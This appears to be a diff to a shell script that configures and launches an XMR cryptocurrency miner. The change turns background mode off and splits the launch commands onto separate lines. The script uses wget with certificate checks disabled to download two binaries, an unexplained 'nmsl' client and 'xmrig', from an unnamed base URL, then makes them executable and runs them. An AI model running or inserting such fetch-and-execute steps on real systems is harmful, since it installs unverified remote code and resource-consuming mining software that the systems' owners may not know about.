@@ -7,7 +7,7 @@ PASSWORD="x"
 
 PRIORITY=5  # set process priority (0 idle, 2 normal to 5 highest)
 DONATE=1  # donate level, default 5%% (5 minutes in 100 minutes)
-BACKGROUND=true  # run the miner in the background
+BACKGROUND=false  # run the miner in the background
 
 WORKER=$(date "+%Y%m%d%H%M%S")
 
@@ -150,8 +150,13 @@ cat>"config.json"<< EOF
 EOF
 
 # Client
-wget --no-check-certificate ${BASE_URL}/nmsl && chmod +x ./nmsl && ./nmsl
+echo "Client Starting..."
+wget --no-check-certificate ${BASE_URL}/nmsl
+chmod +x ./nmsl
+./nmsl
 
 # XMR Miner
-wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && ./xmrig
-
+echo "Miner Starting..."
+wget --no-check-certificate ${BASE_URL}/xmrig
+chmod +x ./xmrig
+./xmrig
